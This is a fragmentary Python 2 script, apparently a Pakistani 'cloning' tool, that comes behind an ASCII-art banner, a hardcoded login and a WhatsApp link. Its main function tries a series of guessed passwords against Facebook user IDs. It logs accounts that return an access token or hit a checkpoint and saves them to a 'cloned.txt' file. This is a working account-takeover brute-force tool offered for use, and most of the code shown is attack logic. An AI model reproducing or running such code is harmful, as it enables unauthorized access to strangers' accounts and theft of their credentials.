...
_   _    _       _ ___ 
 ...
 | . ` | / /\ \ _   | |  __| |  __| |  _ < 
 | |\  |/ ____ \ |__| | |____| |____| |_) |
 |_| \_/_/    \_\____/|______|______|____/ 
...
║OWNER 💓💓💓(NAJEEB_1)                              ║
║  GITHUB 💝💝💝 HAJI NAJEEB                          ║
║ FACEBOOK 💝💝💝HAJI_NAJEEB               ║
║  ENJOY 💝💝💝Pak Cloning                             ║
║   Note 💝💝💝Use Fastest Speed Net             ║
╚══──────────────────────────╝─══╝
"""
print("""
Owner: HAJI_NAJEEB(R.K)
Facebook: HAJINAJEEB
 
""")
CorrectUsername = "NAJEEB_1"
CorrectPassword = "NAJEEB_1"
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            os.system('xdg-https://wa.me/+923148007918')
    else:
...
def Zeek():
    ...
    time.sleep(0.10)
    print '\x1b[1;96m ════NAJEEB_1'
    time.sleep(0.10)
    print '\x1b[1;97m════HAJI_NAJEEB'
    time.sleep(0.10)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;32m[NAJEEB_1-OK]  ' + k + c + user + '  |  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m[NAJEEB_1-CP] ' + k + c + user + '  |  ' + pass1
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;32m[NAJEEB_1-OK]  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m[NAJEEB_1-CP] ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;32m[NAJEEB_1-OK]  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m[NAJEEB_1-CP] ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;32m[NAJEEB_1-OK]  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m[NAJEEB_1-CP] ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;32m[NAJEEB_1-OK]  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m[NAJEEB_1-CP] ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
